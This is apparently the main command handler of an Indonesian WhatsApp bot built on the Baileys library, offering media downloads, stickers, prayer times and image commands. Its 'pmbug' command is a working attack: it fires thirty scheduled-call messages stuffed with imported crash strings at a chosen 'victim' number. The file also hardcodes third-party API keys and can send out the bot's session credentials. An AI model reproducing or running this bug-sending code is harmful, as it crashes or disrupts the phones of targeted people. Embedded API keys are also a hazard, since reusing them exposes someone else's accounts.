require('./config')
process.on("uncaughtException", console.error);
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const scr = require('@bochilteam/scraper')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const ytdl = require("ytdl-core")
const fetch = require('node-fetch')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { color, bgcolor, mycolor } = require('./lib/color')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { fetchJson, getBuffer } = require('./lib/fetcher')
const thumb = fs.readFileSync ('./lib/hisoka.jpg')

const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')

const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: global.packname, participant: '0@s.whatsapp.net'}, message: { 'contactMessage': { 'displayName': `Jaa XD`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Jaa XD;;;\nFN:Jaa XD\nitem1.TEL;waid=628383838077485:6283838077485\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}

module.exports = uno = async (uno, m, chatUpdate, store) => {
try{
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const { color, bgcolor, pickRandom, randomNomor } = require('./lib/console.js')
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await uno.decodeJid(uno.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const from = m.key.remoteJid
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const nomore = m.sender.replace(/[^0-9]/g, '')
	
// Group
const groupMetadata = m.isGroup ? await uno.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false

//reply
const reply = (teks) => {
return uno.sendMessage(m.chat, { text: teks ,contextInfo:{forwardingScore: 9999999, isForwarded: false}}, { quoted : fpay })
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await uno.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(mess.erorr)
}}

if (m.message) {
uno.readMessages([m.key])
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
}

switch(command) { 
case 'jadwalsholat': {
let { jadwalsholat } = require('./lib/scraper')
if (!text) return m.reply(`Example : ${prefix + command} jakarta`)
reply(mess.wait)
try{
let result = await jadwalsholat(text)
uno.sendText(m.chat, `*「 JADWAL SHOLAT 」*\n\n⭔ tanggal : ${result.tanggal}\n⭔ imsyak : ${result.imsyak}\n⭔ subuh : ${result.subuh}\n⭔ dzuhur : ${result.dzuhur}\n⭔ ashar : ${result.ashar}\n⭔ maghrib : ${result.maghrib}\n⭔ isya : ${result.isya}`)
}catch (error) {
m.reply(mess.erorr)
}}
break
case 'sertitolol': {
if (!text) return m.reply(`Example: ${prefix + command} username`)
reply(mess.wait)
try{
let buf = await getBuffer(`https://tolol.ibnux.com/img.php?nama=${q}`)
uno.sendMessage(m.chat, { image: buf, caption: mess.success })
}catch (error) {
m.reply(mess.erorr)
}}
break
case "tiktok": { 
if (!text) return m.reply(`Example : ${prefix + command} https://vm.tiktok.com/ZSLdF9NYN`)
reply(mess.wait)
try{
let tik = await fetchJson(`https://api.tiklydown.me/api/download?url=${text}`)
let vidtik = await uno.sendMessage(from, { video: { url: tik.video.noWatermark }, caption: mess.success })
}catch (error) {
m.reply(mess.erorr)
}}
break
case 'ytmp4': { 
if (!text) return m.reply(`Example : ${prefix+command} text`)
reply(mess.wait)
try{
let anu = await fetchJson(`https://api.arifzyn.xyz/download/youtube?url=${text}`)
const cpt = anu.result.channel
const nick = anu.result.title
uno.sendMessage(m.chat, { video: { url: anu.result.mp4.data}, caption: `💬Judul : ${nick}\n👤Channel : ${cpt}`})
}catch (error) {
m.reply(mess.erorr)
}}
break
case 'pmbug' :{ 
 if (!text) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": Date.now(),
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
uno.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'ytmp3': { 
if (!text) return m.reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`)
downloadMp3(text)
}
break
case 'sticker': { 
if (/image/.test(mime)) {
let media = await quoted.download()
reply(mess.wait)
try{
let encmedia = await uno.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}catch (error) {
m.reply(mess.erorr)
}}else {
m.reply(`Example : ${prefix + command} reply foto`)
}}
break
case 'toimg': { 
if (!/webp/.test(mime)) return m.reply(`Example : ${prefix + command} reply sticker`)
reply(mess.wait)
try{
let media = await uno.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
uno.sendMessage(m.chat, { image: buffer })
fs.unlinkSync(ran)
})}catch (error) {
m.reply(mess.erorr)
}}
break
case 'remini':{ 
if (!m.quoted) return m.reply(`Example : ${prefix + command} reply image`)
reply(mess.wait)
try{
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
uno.sendMessage(m.chat, { image: proses, caption:mess.success})
}catch (error) {
m.reply(mess.erorr)
}}
break
case 'tts': { 
if (!text) return m.reply(`Example : ${prefix + command} text`)
reply(mess.wait)
try{
let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_id?query=${text}`)
uno.sendMessage(from, { audio: { url: tts.result }, mimetype: 'audio/mpeg' })
}catch (error) {
m.reply(mess.erorr)
}}
break
case 'ambilsesi': 
if (!isCreator) return m.reply(mess.owner)
reply(mess.wait)
let sesi = await fs.readFileSync('./jaa/creds.json')
uno.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: 'creds.json' })
break
case 'tourl': { 
if (!/video/.test(mime) && !/image/.test(mime)) throw m.reply(`Example : ${prefix + command} send/reply image`)
reply(mess.wait)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await uno.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'loli': { 
reply(mess.wait)
try{
uno.sendMessage(m.chat, { image: { url: `https://api.fgmods.xyz/api/img/loli?apikey=z48CV4SH`}, caption: mess.success})
}catch (error) {
m.reply(mess.erorr)
}}
break
case 'girl': { 
reply(mess.wait)
try{
uno.sendMessage(m.chat, { image: { url: `https://api.fgmods.xyz/api/img/girl?apikey=z48CV4SH`}, caption: mess.success})
}catch (error) {
m.reply(mess.erorr)
}}
break
case 'asupan': { 
reply(mess.wait)
try{
uno.sendMessage(m.chat, { video: { url: `https://api.fgmods.xyz/api/img/asupan?apikey=z48CV4SH`}, caption: mess.success})
}catch (error) {
m.reply(mess.erorr)
}}
break
case 'neko': { 
reply(mess.wait)
try{
uno.sendMessage(m.chat, { image: { url: `https://api.fgmods.xyz/api/img/neko?apikey=z48CV4SH`}, caption: mess.success})
}catch (error) {
m.reply(mess.erorr)
}}
break
case 'megumin': { 
reply(mess.wait)
try{
uno.sendMessage(m.chat, { image: { url: `https://api.fgmods.xyz/api/img/megumin?apikey=z48CV4SH`}, caption: mess.success})
}catch (error) {
m.reply(mess.erorr)
}}
break
case 'dado': { 
reply(mess.wait)
try{
uno.sendMessage(m.chat, { image: { url: `https://api.fgmods.xyz/api/game/dado?apikey=z48CV4SH`}, caption: mess.success})
}catch (error) {
m.reply(mess.erorr)
}}
break
case 'creator': { 
const vcard =
'BEGIN:VCARD\n' + // metadata of the contact card
'VERSION:3.0\n' +
`FN:${nama}\n` + // full name
`ORG:${nama};\n` + // the organization of the contact
`TEL;type=MSG;type=CELL;type=VOICE;waid=${owner}:+${owner}\n` + // WhatsApp ID + phone number
'END:VCARD'
uno.sendMessage(m.chat, {
contacts: {
displayName: owner,
contacts: [{ vcard }],
},
}, { quoted: fpay})
}
break
case 'randommeme': { 
reply(mess.wait)
try{
let anuu = await fetchJson(`https://xzn.wtf/api/randommeme?apikey=JaaTzy`)
uno.sendMessage(m.chat, { video: { url: anuu.media}, caption: mess.success})
}catch (error) {
m.reply(mess.erorr)
}}
break
case 'toanime': { 
if (!text) return m.reply(`Example : ${prefix+command} https://telegra.ph/file/95920995486c09bbee2ab.png`)
let ss = await getBuffer(`https://xzn.wtf/api/toanime?url=${text}&apikey=JaaTzy`)
try{
await uno.sendMessage(m.chat, {image: ss, caption: mess.success})
}catch (err){
m.reply(mess.erorr)
}}
break
case 'join': { 
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`Example : ${prefix + command} https://chat.whatsapp.com/`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link tidak valid')
reply(mess.wait)
try{
let result = args[0].split('https://chat.whatsapp.com/')[1]
await uno.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}catch (err){
m.reply(mess.erorr)
}}
break
case 'leave': { 
if (!isCreator) return m.reply(mess.owner)
try{
await uno.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}catch (err){
m.reply(mess.erorr)
}}
break
case 'welcome': 
if (!isCreator) return
if (args[0] == 'on'){
if (global.welcome) return reply('UDAH ON!')
global.welcome = true
reply('Sukses')
}else if (args[0] == 'off'){
if (!global.welcome) return reply('UDAH OFF!')
global.welcome = false
reply('Sukses')
}
break
case 'menu':{ 
menu =`🤖 Hai saya uno bot
harap jangan spam ya kak

All command :
✨ambilsesi
✨tts
✨sticker
✨loli
✨girl
✨join
✨leave
✨neko
✨remini
✨toimg
✨ytmp3
✨ytmp4
✨tourl
✨tiktok
✨dado
✨asupan
✨sertitolol
✨megumin
✨welcome
✨toanime
✨jadwalsholat
✨randommeme`
uno.sendMessage(m.chat, { 
document: thumb, 
fileName: 'Uno MD',
mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
fileLength: 0,
pageCount: '2023',
caption: menu,
contextInfo: {
externalAdReply: {   
title: `No spam ya ganteng\n${runtime(process.uptime())}`, 
thumbnail: thumb, 
body: '',
sourceUrl: 'https://chat.whatsapp.com/Fa311c2RKPaGgmXMZS1FPG',
mediaType: 1,
renderLargerThumbnail: true
}}})}
break
default:
}
}catch (error) {
m.reply(mess.erorr)
}}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
